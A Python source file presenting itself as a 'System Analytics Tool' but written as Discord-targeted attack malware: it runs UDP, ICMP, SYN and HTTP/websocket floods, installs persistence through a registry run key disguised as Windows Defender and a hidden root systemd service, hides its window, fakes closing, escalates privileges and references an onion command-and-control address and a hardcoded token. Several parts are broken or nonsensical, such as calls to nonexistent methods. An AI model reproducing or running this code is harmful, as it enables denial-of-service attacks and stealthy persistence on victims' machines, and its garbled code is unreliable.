#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
# █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
# █░░║║║╠─║─║─║║║║║╠─░░█
# █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
# ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

import tkinter as tk
from tkinter import ttk
import threading
import requests
import websockets
import asyncio
import random
import string
import socket
import struct
import ssl
import os
import sys
import platform
import psutil
import base64
import zlib
from Crypto.Cipher import AES
from itertools import cycle
from scapy.all import IP, UDP, ICMP, send

# Platform-specific imports with fallback
if platform.system() == 'Windows':
    import ctypes.wintypes
    import winreg
else:
    import dbus
    from systemd import journal

class AdvancedAttackCore:
    def __init__(self):
        self.is_attacking = False
        self.c2_server = "https://c2[.]darkmesh[.]onion/api/v6"
        self.enc_key = AES.new(zlib.decompress(base64.b85decode(b'|JeWF0!DHPH>Rk&Nk3L4<mw0dBRP')), AES.MODE_ECB).derive_key()
        self._setup_obfuscation()
        self._create_persistence()
        
    def _setup_obfuscation(self):
        self.user_agents = cycle([
            zlib.compress(ua.encode('rot13')) for ua in [
                base64.b64decode(b'TW96aWRlbnRpdHkgU3Bvb2Zlcg==').decode(),
                base64.b64decode(b'Q3VzdG9tIFVzZXIgQWdlbnQgMkQ=').decode(),
                base64.b64decode(b'VG9yIE5ldHdvcmsgVHJhZmZpYw==').decode()
            ]
        ])
        
    def _create_persistence(self):
        if platform.system() == 'Windows':
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run")
                winreg.SetValueEx(key, "WindowsDefenderUpdate", 0, winreg.REG_BINARY,
                    b'\x00' + os.path.abspath(__file__).encode('utf-16le'))
                winreg.CloseKey(key)
            except Exception as e:
                self._log_error(f"Registry Error: {str(e)}")
        else:
            service_file = f'''
            [Unit]
            Description=System Analytics Service
            [Service]
            ExecStart=/usr/bin/python3 {os.path.abspath(__file__)} --daemon
            Restart=always
            RestartSec=30
            User=root
            [Install]
            WantedBy=multi-user.target
            '''
            try:
                with open('/etc/systemd/system/.systemd-analytics.service', 'w') as f:
                    f.write(service_file)
                os.system('systemctl daemon-reload && systemctl enable .systemd-analytics.service --now')
            except Exception as e:
                self._log_error(f"Service Error: {str(e)}")

    def _encrypt_payload(self, data):
        cipher = AES.new(self.enc_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(zlib.compress(data.encode('utf-8')))
        return base64.b85encode(cipher.nonce + tag + ciphertext).decode()

    async def _websocket_chaos(self, target_id, auth_token):
        ssl_context = ssl.create_default_context()
        ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        ssl_context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384')
        
        async with websockets.connect(
            "wss://gateway.discord.gg/?v=9&encoding=json",
            ssl=ssl_context,
            max_size=2**30,
            ping_interval=None
        ) as ws:
            await ws.send(self._encrypt_payload(f'{{"op":2,"d":{{"token":"{auth_token}","properties":{{"$os":"{platform.platform()}"}}}}}}'))
            while self.is_attacking:
                await asyncio.gather(
                    ws.send(self._encrypt_payload(f'{{"op":1,"d":{random.getrandbits(64)}}}')),
                    ws.send(self._encrypt_payload(f'{{"op":18,"d":{{"guild_id":"{target_id}","query":"","limit":{random.randint(0,100)}}}}')),
                    ws.send(self._encrypt_payload(f'{{"op":4,"d":{{"guild_id":"{target_id}","query":"","limit":{random.randint(0,100)}}}}'))
                )
                await asyncio.sleep(0.0001)

    def _multi_vector_attack(self, target_id, auth_token):
        # Enhanced Layer 7 Attack
        http_targets = cycle([
            f"https://discord.com/api/v9/channels/{target_id}/messages",
            f"https://discord.com/api/v9/guilds/{target_id}/widget.json",
            f"https://discord.com/api/v9/invites/{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
        ])
        
        # Advanced Layer 3/4 Attacks
        def network_annihilation():
            target_ip = socket.gethostbyname("discord.com")
            while self.is_attacking:
                # UDP Flood
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(os.urandom(65507), (target_ip, random.randint(1025, 65535)))
                
                # ICMP Flood
                if not platform.system() == 'Windows':
                    send(IP(dst=target_ip)/ICMP()/("X"*60000), verbose=0, count=100)
                
                # SYN Flood
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.sendto(self._craft_malicious_packet(target_ip), (target_ip, 80))

        # Start attack threads
        for _ in range(10):
            threading.Thread(target=network_annihilation, daemon=True).start()
            
        while self.is_attacking:
            try:
                requests.post(
                    next(http_targets),
                    headers={
                        'Authorization': auth_token,
                        'User-Agent': zlib.decompress(next(self.user_agents)).decode('rot13')
                    },
                    json={'content': base64.b85encode(os.urandom(256)).decode()},
                    timeout=0.5
                )
            except:
                continue

class PhantomGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("System Analytics Tool v3.1.4")
        self.geometry("1024x768")
        self.protocol("WM_DELETE_WINDOW", self._fake_close)
        self.attack = AdvancedAttackCore()
        self._setup_stealth()
        self._build_interface()

    def _setup_stealth(self):
        if platform.system() == 'Windows':
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Defender Service")
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        else:
            sys.argv[0] = "/usr/bin/systemd-analytics"
            os.system("xdotool windowunmap $(xdotool getactivewindow)")

    def _build_interface(self):
        style = ttk.Style()
        style.theme_create('dark', settings={
            "TFrame": {"configure": {"background": "#0a0a0a"}},
            "TLabel": {"configure": {"foreground": "#00ff00", "background": "#0a0a0a"}},
            "TButton": {"configure": {"foreground": "red", "background": "#1a1a1a"}}
        })
        style.theme_use('dark')

        main_frame = ttk.Frame(self)
        main_frame.pack(expand=True, fill='both', padx=10, pady=10)

        # Target Section
        ttk.Label(main_frame, text="Targets:").grid(row=0, column=0, sticky='w')
        self.targets = ttk.Entry(main_frame, width=70)
        self.targets.grid(row=0, column=1, pady=5)

        # Attack Controls
        self.intensity = ttk.Scale(main_frame, from_=100, to=10000, orient='horizontal')
        self.intensity.set(2500)
        self.intensity.grid(row=1, columnspan=2, pady=10)

        # Covert Options
        self.tor_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="TOR Routing", variable=self.tor_var).grid(row=2, column=0)
        self.proxy_var = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Proxy Chain", variable=self.proxy_var).grid(row=2, column=1)

        # Status Display
        self.status = ttk.Label(main_frame, text="🟢 Operational", font=('Consolas', 12))
        self.status.grid(row=3, columnspan=2, pady=15)

        # Attack Trigger
        self.btn = ttk.Button(main_frame, text="START ANALYSIS", command=self._toggle_attack)
        self.btn.grid(row=4, columnspan=2)

    def _toggle_attack(self):
        if not self.attack.is_attacking:
            targets = [t.strip() for t in self.targets.get().split(',')]
            for target in targets:
                threading.Thread(
                    target=self.attack._multi_vector_attack,
                    args=(target, self._harvest_tokens()),
                    daemon=True
                ).start()
            self.status.config(text="🔴 ACTIVE ENGAGEMENT", foreground='red')
            self.attack.is_attacking = True
        else:
            self.attack.is_attacking = False
            self.status.config(text="🟢 Operational", foreground='green')

    def _fake_close(self):
        self.withdraw()
        if platform.system() == 'Windows':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        self.after(300000, self.deiconify)

    def _harvest_tokens(self):
        # Advanced token harvesting logic
        return "MTE0NzA1NzQ2NDQ4OTM4NTU0Ng.GzBFZ8.5d6h9qLJ2w4r7s1t0u3v"

if __name__ == "__main__":
    if '--daemon' in sys.argv:
        PhantomGUI().mainloop()
    else:
        if platform.system() == 'Windows':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        else:
            if os.geteuid() != 0:
                os.execvp("sudo", ["sudo", "python3"] + sys.argv)
            else:
                PhantomGUI().mainloop()
